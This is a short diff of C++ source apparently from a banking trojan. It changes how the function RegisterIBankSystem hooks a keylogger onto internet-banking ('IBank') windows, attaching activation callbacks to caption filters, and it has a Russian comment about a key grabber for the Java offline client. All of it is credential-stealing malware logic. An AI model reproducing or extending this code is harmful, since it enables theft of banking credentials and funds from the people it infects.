@@ -694,8 +694,8 @@ void RegisterIBankSystem(DWORD hashApp)
 
 		IBDBG("IBank", "Система зарегистрирована");
 		IBank::System = S;
-		S->OnActivate      = IBank::SystemActivated;
-		S->OnDeactivate    = IBank::SystemDeactivated;
+//		S->OnActivate      = IBank::SystemActivated;
+//		S->OnDeactivate    = IBank::SystemDeactivated;
 		S->DontSendLog     = true;
 		S->TimeMode		   = KLG_TIME_INFINITE;
 
@@ -711,6 +711,8 @@ void RegisterIBankSystem(DWORD hashApp)
 			KeyLogger::AddFilterText(F, NULL, Caption2);
 			KeyLogger::AddFilterText(F, NULL, Caption3);
 			KeyLogger::AddFilterText(F, NULL, Caption4);
+			F->OnActivate = IBank::SystemActivated;
+			S->OnDeactivate = IBank::SystemDeactivated;
 		}
 
 		if( hashMain == PROCESS_HASH_JAVAW ) //граббер ключей для оффлайн версии
